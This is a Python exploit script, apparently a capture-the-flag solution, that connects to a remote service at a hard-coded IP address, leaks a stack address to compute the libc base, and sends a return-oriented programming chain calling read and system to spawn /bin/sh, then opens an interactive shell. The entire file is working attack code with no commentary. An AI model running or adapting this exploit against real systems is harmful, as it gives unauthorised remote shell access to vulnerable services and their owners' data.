#!/usr/bin/env python
from sc_pwn import *

rhp     = ('136.243.194.41',666)
#rhp     = ('192.168.75.129',8080)
#rhp     = ('192.168.254.67',8080)

addr_main_mprotect  = 0x004004ae

offset_libc_exit        = 0x00039d70
offset_libc_system      = 0x000443d0
offset_libc_read        = 0x000f7470
offset_libc_pop_rdi     = 0x000218a2
offset_libc_pop_rsi     = 0x000232f5
offset_libc_pop_rdx     = 0x00001b92

sh = '/bin/sh\x00'

#==========
def attack(nc,i):
    exploit  = 'a'*0x8+'b'
    nc.send(pack_64(len(exploit))+exploit)
    addr_stack = '\x00'+nc.read_all()[9:-1]
    
    addr_stack          = unpack_64(addr_stack+'\x00'*(8-len(addr_stack))) - 0x1000
    addr_base_libc      = addr_stack - 0x5e5000 + 0x1000*i
    addr_libc_exit      = addr_base_libc + offset_libc_exit
    addr_libc_system    = addr_base_libc + offset_libc_system
    addr_libc_read      = addr_base_libc + offset_libc_read
    addr_libc_pop_rdi   = addr_base_libc + offset_libc_pop_rdi
    addr_libc_pop_rsi   = addr_base_libc + offset_libc_pop_rsi
    addr_libc_pop_rdx   = addr_base_libc + offset_libc_pop_rdx

    info('addr_stack        = 0x%08x' % addr_stack)
    info('addr_base_libc    = 0x%08x' % addr_base_libc)
    
    exploit  = 'a'*0x8
    exploit += pack_64(addr_stack-0x2000)
    exploit += pack_64(addr_main_mprotect)
    nc.send(pack_64(len(exploit))+exploit)

    exploit  = 'a'*0x8
    exploit += pack_64(addr_stack)
    exploit += pack_64(addr_libc_pop_rdi)
    exploit += pack_64(0)
    exploit += pack_64(addr_libc_pop_rsi)
    exploit += pack_64(addr_stack+0x800)
    exploit += pack_64(addr_libc_pop_rdx)
    exploit += pack_64(len(sh))
    exploit += pack_64(addr_libc_read)
    exploit += pack_64(addr_libc_pop_rdi)
    exploit += pack_64(addr_stack+0x800)
    exploit += pack_64(addr_libc_system)
    exploit += pack_64(addr_libc_exit)
    nc.send(pack_64(len(exploit))+exploit+sh)

#==========

if __name__=='__main__':
    nc = Communicate(rhp)
    attack(nc,-4)

    sh = Shell(nc)
    sh.select()

    del(sh)
    del(nc)
    
#==========
